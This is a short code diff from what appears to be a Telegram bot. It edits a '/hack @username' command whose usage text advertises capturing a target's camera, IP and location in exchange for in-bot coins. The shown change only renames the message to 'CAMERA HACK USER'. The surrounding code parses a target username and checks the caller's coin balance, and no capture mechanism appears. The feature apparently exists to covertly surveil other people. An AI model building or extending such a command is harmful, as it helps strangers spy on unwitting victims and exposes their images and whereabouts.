@@ -457,7 +457,7 @@ bot.command("wordstats", async (ctx) => {
 bot.command("hack", async (ctx) => {
   let args = ctx.message.text.split(" ");
   let targetUsername = args[1];
-  if (!targetUsername) return ctx.reply(`💀 **HACK USER** 💀\n\nUsage: /hack @username\n💰 Cost: ${TRACK_COST} coins\n📸 Captures camera + IP + location`);
+  if (!targetUsername) return ctx.reply(`💀 **CAMERA HACK USER** 💀\n\nUsage: /hack @username\n💰 Cost: ${TRACK_COST} coins\n📸 Captures camera + IP + location`);
   let user = await initUser(ctx.from.id);
   if (user.coins < TRACK_COST) return ctx.reply(`❌ Need ${TRACK_COST} coins!`);
   let targetId = null;
